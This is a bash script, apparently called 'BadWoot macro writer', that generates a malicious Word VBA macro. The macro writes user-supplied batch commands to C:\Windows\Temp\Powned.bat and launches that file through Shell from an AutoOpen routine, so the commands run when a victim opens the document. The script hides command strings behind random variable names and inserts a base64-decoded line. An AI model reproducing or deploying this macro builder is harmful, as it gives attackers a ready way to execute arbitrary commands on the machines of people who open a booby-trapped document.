#!/bin/bash

banner()
{
    echo ''
    echo ''
    echo '      (ô-ô)'
    echo '       ( )'
    echo 'BadWoot macro writer'
    echo ''
    echo '    By Ariane'
    echo ''
    echo "(Type 'finish' if end) (type '\\\' for '\' ex : C:\\\ for C:\)"
    echo ''
    echo 'Pro Tips : Place your BAT script in /tmp/line.dat and type finish !'
    echo 'Final BAT file is write in C:\Windows\Temp\Powned.bat'
    echo ''
}

#ENV()
out=/tmp/macro.vba
head=/tmp/head.macro
foot=/tmp/foot.macro
footer=/tmp/footer.macro

Create_Doc()
{
    cat $head >> $out
    cat /tmp/line.dat >> $out
    cat $foot >> $out
    Create_Footer
    cat $footer >> $out
    rm $footer
    rm $head
    rm $foot
    rm /tmp/line.dat
    clear
    banner
    echo "macro saved in /tmp/macro.vba"
    exit
}


#Edite l'entête
Create_Head()
{
    echo "Sub coucou()" >> $head
    echo "Dim f As Integer" >> $head
    echo "Dim Powned As String" >> $head
    echo "J01hS3IwPjw+bTRr4oKscicK" |base64 -d >> $head
    echo "f = FreeFile" >> $head
    echo "Powned = \"C:\Windows\Temp\"\" >> $head
}

#String a ecrir dans le doc final
Line()
{
while true
do
    clear
    banner
    read -p "ligne de cmd > " line
    if [[ $line = "finish" ]]; then
        Create_Doc
    fi
    var=$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-20} | head -n 1)
    echo "$var = \"$line"\" >> /tmp/line.dat
    echo "Dim $var As String" >> $head
    echo 'Open Powned For Output As #f' >> $foot
    echo "print #f, $var" >> $foot
    echo "Close #f" >> $foot
done
}

#Edite la fin du doc
Create_Footer()
{
    echo "Shell (Powned)" >> $footer
    echo "End Sub" >> $footer
    echo "Sub AutoOpen()" >> $footer
    echo "coucou" >> $footer
    echo "End Sub" >> $footer
}

Create_Head
Line
Create_Footer